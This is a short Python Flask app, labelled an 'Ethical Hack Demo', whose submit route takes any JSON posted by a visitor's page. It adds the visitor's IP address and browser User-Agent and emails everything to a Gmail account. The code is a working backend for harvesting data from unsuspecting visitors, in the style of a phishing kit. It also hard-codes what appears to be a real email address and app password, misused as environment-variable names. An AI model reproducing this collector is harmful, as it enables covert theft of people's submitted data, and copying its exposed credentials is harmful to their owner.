import os
from flask import Flask, request, render_template
import smtplib
from email.message import EmailMessage

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    data = request.json
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")

    body = "Collected Data from Ethical Demo:\\n\\n"
    for key, value in data.items():
        body += f"{key}: {value}\\n"
    body += f"\\nIP Address: {ip}\\nUser-Agent: {user_agent}"

    EMAIL = os.environ.get("akshitsrivastav95@gmail.com")
    PASSWORD = os.environ.get("ookm etpx ztnc zcmz")

    msg = EmailMessage()
    msg.set_content(body)
    msg["Subject"] = "[Ethical Hack Demo] Collected Data"
    msg["From"] = EMAIL
    msg["To"] = EMAIL

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(EMAIL, PASSWORD)
        server.send_message(msg)

    return "✅ Data sent to your email successfully!"

if __name__ == "__main__":
    app.run(debug=True)
